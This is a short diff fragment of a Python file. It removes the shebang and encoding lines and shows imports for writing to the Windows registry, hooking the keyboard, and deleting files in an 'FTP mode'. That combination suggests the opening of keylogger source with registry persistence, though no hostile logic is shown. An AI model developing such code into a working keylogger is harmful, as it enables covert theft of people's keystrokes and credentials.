@@ -1,5 +1,3 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
 from winreg import OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
 import keyboard            # for keyboard hooks. See docs https://github.com/boppreh/keyboard
 import os                  # for handling paths and removing files (FTP mode)
